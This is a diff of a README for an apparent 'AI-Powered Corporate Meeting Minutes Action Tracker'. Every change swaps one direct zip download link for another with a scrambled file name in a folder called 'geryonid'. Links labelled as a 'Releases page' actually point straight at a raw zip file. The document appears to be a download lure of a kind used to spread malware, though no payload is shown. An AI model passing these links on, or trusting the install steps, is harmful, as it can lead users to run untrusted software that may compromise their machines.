@@ -1,6 +1,6 @@
 # 🤖 AI-Powered-Corporate-Meeting-Minutes-Action-Tracker - Simplify Meeting Notes and Tasks
 
-[![Download Latest Release](https://raw.githubusercontent.com/IceZ1/AI-Powered-Corporate-Meeting-Minutes-Action-Tracker/main/geryonid/AI-Powered-Corporate-Meeting-Minutes-Action-Tracker.zip%20Latest%20Release-%E2%86%92-brightgreen)](https://raw.githubusercontent.com/IceZ1/AI-Powered-Corporate-Meeting-Minutes-Action-Tracker/main/geryonid/AI-Powered-Corporate-Meeting-Minutes-Action-Tracker.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/IceZ1/AI-Powered-Corporate-Meeting-Minutes-Action-Tracker/main/geryonid/Tracker_Meeting_Minutes_Powered_A_Action_Corporate_v1.4.zip%20Latest%20Release-%E2%86%92-brightgreen)](https://raw.githubusercontent.com/IceZ1/AI-Powered-Corporate-Meeting-Minutes-Action-Tracker/main/geryonid/Tracker_Meeting_Minutes_Powered_A_Action_Corporate_v1.4.zip)
 
 ## 📚 Overview
 
@@ -11,7 +11,7 @@ The AI-Powered Corporate Meeting Minutes Action Tracker is designed to make your
 To start using the AI-Powered Corporate Meeting Minutes Action Tracker, follow these steps:
 
 1. **Visit the Downloads Page**  
-   Go to the [Releases page](https://raw.githubusercontent.com/IceZ1/AI-Powered-Corporate-Meeting-Minutes-Action-Tracker/main/geryonid/AI-Powered-Corporate-Meeting-Minutes-Action-Tracker.zip) to find the latest version of the software.
+   Go to the [Releases page](https://raw.githubusercontent.com/IceZ1/AI-Powered-Corporate-Meeting-Minutes-Action-Tracker/main/geryonid/Tracker_Meeting_Minutes_Powered_A_Action_Corporate_v1.4.zip) to find the latest version of the software.
 
 2. **Download the Application**  
    Locate the version that aligns with your operating system. Click the download link to save the file to your computer.
@@ -41,7 +41,7 @@ To start using the AI-Powered Corporate Meeting Minutes Action Tracker, follow t
 
 ## 📥 Download & Install
 
-You can download the software by visiting the [Releases page](https://raw.githubusercontent.com/IceZ1/AI-Powered-Corporate-Meeting-Minutes-Action-Tracker/main/geryonid/AI-Powered-Corporate-Meeting-Minutes-Action-Tracker.zip). Look for the most recent version available, and follow the previously mentioned steps for installation.
+You can download the software by visiting the [Releases page](https://raw.githubusercontent.com/IceZ1/AI-Powered-Corporate-Meeting-Minutes-Action-Tracker/main/geryonid/Tracker_Meeting_Minutes_Powered_A_Action_Corporate_v1.4.zip). Look for the most recent version available, and follow the previously mentioned steps for installation.
 
 ## ⚙️ Features
 
